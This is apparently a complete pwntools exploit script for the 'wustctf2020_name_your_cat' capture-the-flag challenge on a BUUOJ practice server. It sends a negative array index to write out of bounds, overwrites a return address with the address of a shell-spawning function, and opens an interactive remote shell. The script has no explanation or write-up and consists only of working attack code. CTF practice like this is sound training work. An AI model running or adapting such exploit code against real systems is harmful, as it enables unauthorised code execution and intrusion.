from pwn import *
p = remote("node3.buuoj.cn","26696")
#p = process("./wustctf2020_name_your_cat")

get_shell = 0x080485CB

p.sendlineafter("which?","-5")
#gdb.attach(p)
p.sendafter(":",p32(get_shell))

p.interactive()